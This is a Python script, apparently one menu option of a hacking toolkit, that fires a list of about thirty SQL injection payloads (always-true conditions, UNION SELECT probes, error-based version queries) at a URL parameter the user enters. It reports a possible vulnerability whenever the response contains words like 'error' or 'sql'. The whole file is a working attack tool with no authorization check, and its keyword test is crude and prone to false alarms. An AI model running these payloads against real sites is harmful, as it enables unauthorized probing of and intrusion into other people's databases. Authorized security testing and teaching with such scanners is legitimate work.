import requests
import os
import time

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1 /*",
    "' AND 1=CONVERT(int, @@version) --",
    "' AND 1=CONVERT(int, @@version) /*",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL, NULL --",
    "' UNION SELECT NULL, user(), NULL --",
    "' UNION SELECT NULL, @@version --",
    "' UNION SELECT 1, 'text', 3 --",
    "' UNION ALL SELECT NULL, NULL, NULL, NULL --",
    "' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password = 'password') --",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 1=1/*",
    "' OR 1=1--",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND 1=1/*",
    "' AND 1=2/*",
    "' AND 1=1--",
    "' AND 1=1'",
    "' AND 1=2",
    "' AND 1=2--",
    "' AND 1=2/*",
    "' AND 1=2#",
    "' AND 1=2--",
    "' AND 1=2 /*",
    "' AND 1=2 #",
    "' AND 1=2 --",
]

def sql_vulnerability(url, param):
    vulnerable = False
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url, timeout=10)
            if "error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
                print(f"\033[31mPossible SQL Injection vulnerability detected with payload: {payload}\033[0m")
                print(f"\033[31mVulnerable URL: {test_url}\033[0m")
                vulnerable = True
        except requests.RequestException as e:
            print(f"Request failed: {e}")
    
    if not vulnerable:
        print("\033[31mNo SQL Injection vulnerabilities detected.\033[0m")

menu = """
          ██████   █████   ██▓
         ▒██    ▒ ▒██▓  ██▒▓██▒
         ░ ▓██▄   ▒██▒  ██░▒██░
           ▒   ██▒░██  █▀ ░▒██░
         ▒██████▒▒░▒███▒█▄ ░██████▒
         ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░
         ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░
         ░  ░  ░     ░   ░   ░ ░
              ░      ░        ░  ░

"""
menu2 = """
[0] Back to main
[1] SQL Vulnerability Scanner
"""
def show_menu():
    print(f"\033[31m{menu}\033[0m")
    print(f"\033[31m{menu2}\033[0m")

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_menu()
        try:
            choice = int(input('\033[31mChoice >> \033[0m'))
            if choice == 0:
                os.system('python cyb3rtech.py')
                break
            elif choice == 1:
                url = input('\033[31mEnter the URL to test (e.g., http://example.com/profile.php): \033[0m').strip()
                param = input('\033[31mEnter the URL parameter to test (e.g., id): \033[0m').strip()
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[31m{menu}\033[0m")
                print(f"\33[31mRecherche en cours..\33[0m")
                time.sleep(2)
                
                sql_vulnerability(url, param)
                input("\n\033[31mPress Enter to return to the menu...\033[0m")
                os.system('cls' if os.name == 'nt' else 'clear')
                show_menu()
            else:
                print("\033[31m[!]\033[0m Invalid choice \033[31m[!]\033[0m")
                input("\n\033[31mPress Enter to return to the menu...\033[0m")
                os.system('cls' if os.name == 'nt' else 'clear')
                show_menu()
        except ValueError:
            print("\033[31mPlease enter a valid number\033[0m")
            input("\n\033[31mPress Enter to return to the menu...\033[0m")
            os.system('cls' if os.name == 'nt' else 'clear')
            show_menu()

if __name__ == "__main__":
    main()
